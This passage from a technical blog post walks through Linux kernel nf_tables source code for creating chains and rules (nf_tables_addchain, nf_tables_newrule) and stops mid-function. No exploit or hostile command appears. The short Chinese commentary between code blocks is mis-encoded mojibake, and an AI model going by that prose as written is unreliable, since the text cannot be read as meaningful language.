class="line">NL_SET_BAD_ATTR(extack, attr);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(chain);</span><br><span class="line">&#125;</span><br><span class="line">chain = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_CHAIN_POLICY]) &#123;</span><br><span class="line"><span class="keyword">if</span> (chain != <span class="literal">NULL</span> &amp;&amp;</span><br><span class="line">    !nft_is_base_chain(chain)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_CHAIN_POLICY]);</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (chain == <span class="literal">NULL</span> &amp;&amp;</span><br><span class="line">    nla[NFTA_CHAIN_HOOK] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_CHAIN_POLICY]);</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">policy = ntohl(nla_get_be32(nla[NFTA_CHAIN_POLICY]));</span><br><span class="line"><span class="keyword">switch</span> (policy) &#123;</span><br><span class="line"><span class="keyword">case</span> NF_DROP:</span><br><span class="line"><span class="keyword">case</span> NF_ACCEPT:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nft_ctx_init(&amp;ctx, net, skb, nlh, family, table, chain, nla);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (chain != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_EXCL) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, attr);</span><br><span class="line"><span class="keyword">return</span> -EEXIST;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE)</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> nf_tables_updchain(&amp;ctx, genmask, policy);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> nf_tables_addchain(&amp;ctx, family, genmask, policy);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆé€šè¿‡<code>table = nft_table_lookup(net, nla[NFTA_CHAIN_TABLE], family, genmask);</code>è·å–å¯¹åº”çš„<code>table</code>ï¼Œå¦‚æœæ˜¯æ²¡æœ‰åˆ™ç›´æ¥é€€å‡ºã€‚ç„¶åä¸Šé¢å­˜åœ¨ä¸¤ç§æ–¹å¼å¯»æ‰¾<code>chain</code>ï¼Œå¦‚æœæ‰¾åˆ°äº†è°ƒç”¨<code>nf_tables_updchain(&amp;ctx, genmask, policy);</code>è¿›è¡Œæ›´æ–°å³å¯ï¼Œå¦‚æœæ²¡æœ‰åˆ™ä½¿ç”¨<code>nf_tables_addchain(&amp;ctx, family, genmask, policy);</code>æ·»åŠ ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_addchain</span><span class="params">(struct nft_ctx *ctx, u8 family, u8 genmask,</span></span></span><br><span class="line"><span class="params"><span class="function">                              u8 policy)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> * <span class="title">const</span> *<span class="title">nla</span> =</span> ctx-&gt;nla;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> *<span class="title">table</span> =</span> ctx-&gt;table;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">nft_base_chain</span> *<span class="title">basechain</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">nft_stats</span> __<span class="title">percpu</span> *<span class="title">stats</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> ctx-&gt;net;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span> *<span class="title">chain</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">nft_rule</span> **<span class="title">rules</span>;</span></span><br><span class="line">  <span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (table-&gt;use == UINT_MAX)</span><br><span class="line">    <span class="keyword">return</span> -EOVERFLOW;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (nla[NFTA_CHAIN_HOOK]) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nft_chain_hook</span> <span class="title">hook</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nf_hook_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line"></span><br><span class="line">    err = nft_chain_parse_hook(net, nla, &amp;hook, family, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">    basechain = kzalloc(<span class="keyword">sizeof</span>(*basechain), GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (basechain == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      nft_chain_release_hook(&amp;hook);</span><br><span class="line">      <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hook.dev != <span class="literal">NULL</span>)</span><br><span class="line">      <span class="built_in">strncpy</span>(basechain-&gt;dev_name, hook.dev-&gt;name, IFNAMSIZ);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nla[NFTA_CHAIN_COUNTERS]) &#123;</span><br><span class="line">      stats = nft_stats_alloc(nla[NFTA_CHAIN_COUNTERS]);</span><br><span class="line">      <span class="keyword">if</span> (IS_ERR(stats)) &#123;</span><br><span class="line">        nft_chain_release_hook(&amp;hook);</span><br><span class="line">        kfree(basechain);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(stats);</span><br><span class="line">      &#125;</span><br><span class="line">      rcu_assign_pointer(basechain-&gt;stats, stats);</span><br><span class="line">      static_branch_inc(&amp;nft_counters_enabled);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    basechain-&gt;type = hook.type;</span><br><span class="line">    chain = &amp;basechain-&gt;chain;</span><br><span class="line"></span><br><span class="line">    ops= &amp;basechain-&gt;ops;</span><br><span class="line">    ops-&gt;pf= family;</span><br><span class="line">    ops-&gt;hooknum= hook.num;</span><br><span class="line">    ops-&gt;priority= hook.priority;</span><br><span class="line">    ops-&gt;priv= chain;</span><br><span class="line">    ops-&gt;hook= hook.type-&gt;hooks[ops-&gt;hooknum];</span><br><span class="line">    ops-&gt;dev= hook.dev;</span><br><span class="line"></span><br><span class="line">    chain-&gt;flags |= NFT_BASE_CHAIN;</span><br><span class="line">    basechain-&gt;policy = policy;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    chain = kzalloc(<span class="keyword">sizeof</span>(*chain), GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (chain == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">  &#125;</span><br><span class="line">  ctx-&gt;chain = chain;</span><br><span class="line"></span><br><span class="line">  INIT_LIST_HEAD(&amp;chain-&gt;rules);</span><br><span class="line">  chain-&gt;handle = nf_tables_alloc_handle(table);</span><br><span class="line">  chain-&gt;table = table;</span><br><span class="line">  chain-&gt;name = nla_strdup(nla[NFTA_CHAIN_NAME], GFP_KERNEL);</span><br><span class="line">  <span class="keyword">if</span> (!chain-&gt;name) &#123;</span><br><span class="line">    err = -ENOMEM;</span><br><span class="line">    <span class="keyword">goto</span> err1;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  rules = nf_tables_chain_alloc_rules(chain, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (!rules) &#123;</span><br><span class="line">    err = -ENOMEM;</span><br><span class="line">    <span class="keyword">goto</span> err1;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  *rules = <span class="literal">NULL</span>;</span><br><span class="line">  rcu_assign_pointer(chain-&gt;rules_gen_0, rules);</span><br><span class="line">  rcu_assign_pointer(chain-&gt;rules_gen_1, rules);</span><br><span class="line"></span><br><span class="line">  err = nf_tables_register_hook(net, table, chain);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err1;</span><br><span class="line"></span><br><span class="line">  err = rhltable_insert_key(&amp;table-&gt;chains_ht, chain-&gt;name,</span><br><span class="line">                            &amp;chain-&gt;rhlhead, nft_chain_ht_params);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">goto</span> err2;</span><br><span class="line"></span><br><span class="line">  err = nft_trans_chain_add(ctx, NFT_MSG_NEWCHAIN);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    rhltable_remove(&amp;table-&gt;chains_ht, &amp;chain-&gt;rhlhead,</span><br><span class="line">                    nft_chain_ht_params);</span><br><span class="line">    <span class="keyword">goto</span> err2;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  table-&gt;use++;</span><br><span class="line">  list_add_tail_rcu(&amp;chain-&gt;<span class="built_in">list</span>, &amp;table-&gt;chains);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  err2:</span><br><span class="line">  nf_tables_unregister_hook(net, table, chain);</span><br><span class="line">  err1:</span><br><span class="line">  nf_tables_chain_destroy(ctx);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆä½¿ç”¨<code>basechain = kzalloc(sizeof(*basechain), GFP_KERNEL);</code>åˆ›å»º<code>basechain</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_base_chain</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nf_hook_ops</span><span class="title">ops</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_chain_type</span>*<span class="title">type</span>;</span></span><br><span class="line">u8policy;</span><br><span class="line">u8flags;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_stats</span> __<span class="title">percpu</span>*<span class="title">stats</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span><span class="title">chain</span>;</span></span><br><span class="line"><span class="keyword">char</span> dev_name[IFNAMSIZ];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>éšåå°†å…¶ä¸­çš„æˆå‘˜åœ°å€ç»™åˆ°<code>chain</code>ï¼Œåç»­å°±æ˜¯ä¸€ç³»åˆ—çš„åˆå§‹åŒ–ç¯èŠ‚</p><h3 id="åˆ›å»ºruleæ“ä½œ"><a href="#åˆ›å»ºruleæ“ä½œ" class="headerlink" title="åˆ›å»ºruleæ“ä½œ"></a>åˆ›å»ºruleæ“ä½œ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_newrule</span><span class="params">(struct net *net, struct sock *nlsk,</span></span></span><br><span class="line"><span class="params"><span class="function">     struct sk_buff *skb, <span class="keyword">const</span> struct nlmsghdr *nlh,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> struct nlattr * <span class="keyword">const</span> nla[],</span></span></span><br><span class="line"><span class="params"><span class="function">     struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nfgenmsg</span> *<span class="title">nfmsg</span> =</span> nlmsg_data(nlh);</span><br><span class="line">u8 genmask = nft_genmask_next(net);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_info</span> *<span class="title">info</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> family = nfmsg-&gt;nfgen_family;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> *<span class="title">table</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span> *<span class="title">chain</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_rule</span> *<span class="title">rule</span>, *<span class="title">old_rule</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_userdata</span> *<span class="title">udata</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_trans</span> *<span class="title">trans</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr</span> *<span class="title">expr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_ctx</span> <span class="title">ctx</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">tmp</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> size, i, n, ulen = <span class="number">0</span>, usize = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> err, rem;</span><br><span class="line">u64 handle, pos_handle;</span><br><span class="line"></span><br><span class="line">lockdep_assert_held(&amp;net-&gt;nft.commit_mutex);</span><br><span class="line"></span><br><span class="line">table = nft_table_lookup(net, nla[NFTA_RULE_TABLE], family, genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(table)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_TABLE]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(table);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">chain = nft_chain_lookup(net, table, nla[NFTA_RULE_CHAIN], genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(chain)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_CHAIN]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(chain);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_RULE_HANDLE]) &#123;</span><br><span class="line">handle = be64_to_cpu(nla_get_be64(nla[NFTA_RULE_HANDLE]));</span><br><span class="line">rule = __nft_rule_lookup(chain, handle);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(rule)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_HANDLE]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(rule);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_EXCL) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_HANDLE]);</span><br><span class="line"><span class="keyword">return</span> -EEXIST;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE)</span><br><span class="line">old_rule = rule;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (!(nlh-&gt;nlmsg_flags &amp; NLM_F_CREATE) ||</span><br><span class="line">    nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">handle = nf_tables_alloc_handle(table);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (chain-&gt;use == UINT_MAX)</span><br><span class="line"><span class="keyword">return</span> -EOVERFLOW;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_RULE_POSITION]) &#123;</span><br><span class="line">pos_handle = be64_to_cpu(nla_get_be64(nla[NFTA_RULE_POSITION]));</span><br><span class="line">old_rule = __nft_rule_lookup(chain, pos_handle);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(old_rule)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_POSITION]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(old_rule);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nla[NFTA_RULE_POSITION_ID]) &#123;</span><br><span class="line">old_rule = nft_rule_lookup_byid(net, nla[NFTA_RULE_POSITION_ID]);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(old_rule)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_POSITION_ID]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(old_rule);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nft_ctx_init(&amp;ctx, net, skb, nlh, family, table, chain, nla);</span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span>;</span><br><span class="line">size = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_RULE_EXPRESSIONS]) &#123;</span><br><span class="line">info = kvmalloc_array(NFT_RULE_MAXEXPRS,</span><br><span class="line">      <span class="keyword">sizeof</span>(struct nft_expr_info),</span><br><span class="line">      GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!info)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">nla_for_each_nested(tmp, nla[NFTA_RULE_EXPRESSIONS], rem) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (nla_type(tmp) != NFTA_LIST_ELEM)</span><br><span class="line"><span class="keyword">goto</span> err1;</span><br><span class="line"><span class="keyword">if</span> (n == NFT_RULE_MAXEXPRS)</span><br><span class="line"><span class="keyword">goto</span> err1;</span><br><span class="line">err = nf_tables_expr_parse(&amp;ctx, tmp, &amp;info[n]);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err1;</span><br><span class="line">size += info[n].ops-&gt;size;</span><br><span class="line">n++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Check for overflow of dlen field */</span></span><br><span class="line">err = -EFBIG;</span><br><span class="line"><span class="keyword">if</span> (size &gt;= <span class="number">1</span> &lt;&lt; <span class="number">12</span>)</span><br><span class="line"><span class="keyword">goto</span> err1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_RULE_USERDATA]) &#123;</span><br><span class="line">ulen = nla_len(nla[NFTA_RULE_USERDATA]);</span><br><span class="line"><span class="keyword">if</span> (ulen &gt; <span class="number">0</span>)</span><br><span class="line">usize = <span class="keyword">sizeof</span>(struct nft_userdata) + ulen;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = -ENOMEM;</span><br><span class="line">rule = kzalloc(<span class="keyword">sizeof</span>(*rule) + size + usize, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (rule == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> err1;</span><br><span class="line"></span><br><span class="line">nft_activate_next(net, rule);</span><br><span class="line"></span><br><span class="line">rule-&gt;handle = handle;</span><br><span class="line">rule-&gt;dlen   = size;</span><br><span class="line">rule-&gt;udata  = ulen ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ulen) &#123;</span><br><span class="line">udata = nft_userdata(rule);</span><br><span class="line">udata-&gt;len = ulen - <span class="number">1</span>;</span><br><span class="line">nla_memcpy(udata-&gt;data, nla[NFTA_RULE_USERDATA], ulen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">expr = nft_expr_first(rule);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">err = nf_tables_newexpr(&amp;ctx, &amp;info[i], expr);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (info[i].ops-&gt;validate)</span><br><span class="line">nft_validate_state_update(net, NFT_VALIDATE_NEED);</span><br><span class="line"></span><br><span class="line">info[i].ops = <span class="literal">NULL</span>;</span><br><span class="line">expr = nft_expr_next(expr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE) &#123;</span><br><span class="line">trans = nft_trans_rule_add(&amp;ctx, NFT_MSG_NEWRULE, rule);</span><br><span class="line"><span class="keyword">if</span> (trans == <span class="literal">NULL</span>) &#123;</span><br><span class="line">err = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> err2;</span><br><span class="line">&#125;</span><br><span class="line">err = nft_delrule(&amp;ctx, old_rule);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">nft_trans_destroy(trans);</span><br><span class="line"><span class="keyword">goto</span> err2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">list_add_tail_rcu(&amp;rule-&gt;<span class="built_in">list</span>, &amp;old_rule-&gt;<span class="built_in">list</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (nft_trans_rule_add(&amp;ctx, NFT_MSG_NEWRULE, rule) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">err = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> err2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_APPEND) &#123;</span><br><span class="line"><span class="keyword">if</span> (old_rule)</span><br><span class="line">list_add_rcu(&amp;rule-&gt;<span class="built_in">list</span>, &amp;old_rule-&gt;<span class="built_in">list</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span 